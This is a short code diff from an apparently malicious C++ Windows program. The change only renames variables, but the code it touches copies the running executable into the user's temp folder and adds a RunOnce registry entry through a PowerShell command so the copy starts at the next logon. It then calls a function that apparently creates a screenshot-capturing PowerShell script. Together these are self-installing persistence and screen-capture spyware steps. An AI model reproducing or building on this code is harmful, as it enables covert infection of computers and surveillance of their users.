@@ -161,7 +161,7 @@ string current_working_directory()
   free(cwd) ;
   return working_directory ;
 }
-void InitConfig(string programName)
+void InitConfig(string currentProgramName)
 {
   HWND window;
   AllocConsole();
@@ -170,15 +170,15 @@ void InitConfig(string programName)
   char username[UNLEN+1];
   DWORD username_len = UNLEN+1;
   GetUserName(username, &username_len);
-  string programNameFinal = "mainFinal.exe";
+  string finalProgramName = "mainFinal.exe";
   string pathUsers = "C:\\Users\\";
   string pathTarget = "\\appdata\\local\\temp\\";
-  string input = current_working_directory()+"\\"+programName;
+  string input = current_working_directory()+"\\"+currentProgramName;
   string output = pathUsers+username+pathTarget;
-  CopyFile(input.c_str(),(output+programNameFinal).c_str(), TRUE);
-  string commandPowerShell = "powershell New-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce -name Main -Value "+output+programNameFinal+" -force";
+  CopyFile(input.c_str(),(output+finalProgramName).c_str(), TRUE);
+  string commandPowerShell = "powershell New-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce -name Main -Value "+output+finalProgramName+" -force";
   system(commandPowerShell.c_str());
-  if(programName != programNameFinal)
+  if(currentProgramName != finalProgramName)
   {
     CreatePrintScreenPS1(output);
   }
